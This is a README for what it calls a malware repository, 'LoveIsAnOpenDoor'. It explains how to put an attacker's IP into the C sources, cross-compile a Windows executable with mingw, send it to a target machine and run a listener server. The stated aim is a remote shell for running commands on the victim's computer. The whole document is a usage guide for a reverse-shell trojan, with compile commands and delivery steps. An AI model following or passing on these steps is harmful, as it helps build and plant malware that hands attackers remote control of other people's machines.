# loveisanopendoor-malware

Note: You will only need .c files, other files will be recompiled for you attacker machine. 
So instead of downloading those file follow the following steps.

How To Use: 
1- Replace your attacker machine's IP address in LoveIsAnOpenDoor.c and Server.c 
2- Install ming into you attacker device apt-get install mingw64 (Already installed)
3- Use following command to compile the Server
	gcc Server.c -o Server 
4- Use following command to compile the exe file. 
	i686-w64-mingw32-gcc -o LoveIsAnOpenDoor.exe LoveIsAnOpenDoor.c -lwsock32 -lwininet 
5- Send the compiled LoveIsAnOpenDoor.exe to target machine  (Already sent)
6- Start Server by using ./Server
7- Execute exe file in target machine.
8- Check for if shell is opened in attacker machine.
9- If shell is opened you can execute commands on target machine remotely
